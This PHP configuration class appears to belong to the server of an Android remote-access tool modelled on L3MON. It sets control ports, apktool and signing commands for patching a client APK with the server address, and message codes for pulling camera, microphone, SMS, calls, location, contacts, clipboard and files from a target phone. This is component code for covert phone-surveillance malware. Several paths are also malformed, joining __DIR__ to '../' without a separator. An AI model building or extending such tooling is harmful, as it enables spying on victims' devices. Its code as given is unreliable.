<?php

namespace Rust\AndroidManage\includes;

class Constants
{
    public static $debug = false;

    public static $web_port = 22533;
    public static $control_port = 22222;

    // Paths
    public static $apkBuildPath = __DIR__ . '../assets/webpublic/build.apk';
    public static $apkSignedBuildPath = __DIR__ . '../assets/webpublic/L3MON.apk';

    public static $downloadsFolder = '/client_downloads';
    public static $downloadsFullPath = __DIR__ . '../assets/webpublic/client_downloads';

    public static $apkTool = __DIR__ . '../app/factory/apktool.jar';
    public static $apkSign = __DIR__ . '../app/factory/sign.jar';
    public static $smaliPath = __DIR__ . '../app/factory/decompiled';
    public static $patchFilePath = __DIR__ . '../app/factory/decompiled/smali/com/etechd/l3mon/IOSocket.smali';

    public static $buildCommand = __DIR__ . 'java -jar "' . __DIR__ . '../app/factory/apktool.jar" b "' . __DIR__ . '../app/factory/decompiled" -o "' . __DIR__ . '../assets/webpublic/build.apk"';
    public static $signCommand = __DIR__ . 'java -jar "' . __DIR__ . '../app/factory/sign.jar" "' . __DIR__ . '../assets/webpublic/build.apk"';

    public static $messageKeys = [
        'camera' => '0xCA',
        'files' => '0xFI',
        'call' => '0xCL',
        'sms' => '0xSM',
        'mic' => '0xMI',
        'location' => '0xLO',
        'contacts' => '0xCO',
        'wifi' => '0xWI',
        'notification' => '0xNO',
        'clipboard' => '0xCB',
        'installed' => '0xIN',
        'permissions' => '0xPM',
        'gotPermission' => '0xGP'
    ];

    public static $logTypes = [
        'error' => [
            'name' => 'ERROR',
            'color' => 'red'
        ],
        'alert' => [
            'name' => 'ALERT',
            'color' => 'amber'
        ],
        'success' => [
            'name' => 'SUCCESS',
            'color' => 'limegreen'
        ],
        'info' => [
            'name' => 'INFO',
            'color' => 'blue'
        ]
    ];
}
